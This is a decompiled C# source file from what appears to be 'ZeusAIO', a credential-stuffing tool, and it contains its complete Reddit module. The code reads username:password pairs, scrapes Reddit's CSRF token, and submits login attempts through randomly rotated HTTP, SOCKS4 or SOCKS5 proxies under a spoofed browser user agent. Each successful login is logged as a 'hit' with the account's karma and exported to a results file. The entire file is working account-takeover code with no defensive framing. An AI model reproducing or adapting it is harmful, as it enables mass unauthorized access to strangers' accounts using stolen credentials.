// Decompiled with JetBrains decompiler
// Type: Reddit.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using ZeusAIO;

namespace Reddit
{
  internal class Check
  {
    private static Uri redditAuth = new Uri("https://www.reddit.com/login/", UriKind.Absolute);
    private static Uri redditAuthPost = new Uri("https://www.reddit.com/login", UriKind.Absolute);

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            CookieStorage cookies = new CookieStorage();
            string csrf = Check.RedditGetCSRF(ref cookies);
            if (!(csrf == ""))
            {
              BytesContent bytesContent;
              try
              {
                bytesContent = new BytesContent(Encoding.Default.GetBytes("csrf_token=" + csrf + "&otp=&password=" + s[1] + "&dest=https%3A%2F%2Fwww.reddit.com&username=" + s[0]));
              }
              catch
              {
                continue;
              }
              using (HttpRequest httpRequest = new HttpRequest())
              {
                proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
                bool flag1 = mainmenu.proxyProtocol == "HTTP";
                if (flag1)
                  httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
                bool flag2 = mainmenu.proxyProtocol == "SOCKS4";
                if (flag2)
                  httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
                bool flag3 = mainmenu.proxyProtocol == "SOCKS5";
                if (flag3)
                  httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
                httpRequest.Cookies = cookies;
                httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36";
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                HttpResponse httpResponse1 = httpRequest.Post(Check.redditAuthPost, (HttpContent) bytesContent);
                if (httpResponse1.StatusCode == HttpStatusCode.OK)
                {
                  if (httpResponse1.ToString().Contains("{\"dest\": \"https://www.reddit.com\"}"))
                  {
                    proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
                    if (flag1)
                      httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
                    if (flag2)
                      httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
                    if (flag3)
                      httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
                    httpRequest.Cookies = cookies;
                    HttpResponse httpResponse2 = httpRequest.Get(new Uri("https://www.reddit.com/"));
                    if (httpResponse2.StatusCode == HttpStatusCode.OK)
                    {
                      string str = Regex.Match(httpResponse2.ToString(), "totalKarma\":(.*?),").Groups[1].Value;
                      if (str == "")
                        str = "?";
                      ++mainmenu.hits;
                      if (mainmenu.p1 == "2")
                        Colorful.Console.WriteLine("[HIT - REDDIT] " + s[0] + ":" + s[1] + " | Karma: " + str, Color.Green);
                      Export.AsResult("/Reddit_hits", s[0] + ":" + s[1] + " | Karma: " + str);
                      return false;
                    }
                  }
                  else
                    break;
                }
                else
                  break;
              }
            }
          }
          catch
          {
            ++mainmenu.errors;
          }
        }
      }
      return true;
    }

    private static string RedditGetCSRF(ref CookieStorage cookies)
    {
      if (0 >= Config.config.Retries + 1)
        return "";
      while (true)
      {
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            string proxyAddress = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
            if (mainmenu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxyAddress);
            if (mainmenu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxyAddress);
            if (mainmenu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxyAddress);
            cookies = new CookieStorage();
            httpRequest.Cookies = cookies;
            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36";
            HttpResponse httpResponse = httpRequest.Get(Check.redditAuth);
            if (httpResponse.StatusCode == HttpStatusCode.OK)
              return Regex.Match(httpResponse.ToString(), "<input type=\"hidden\" name=\"csrf_token\" value=\"(.*?)\">").Groups[1].Value;
            ++mainmenu.errors;
          }
        }
        catch
        {
          ++mainmenu.errors;
        }
      }
    }
  }
}
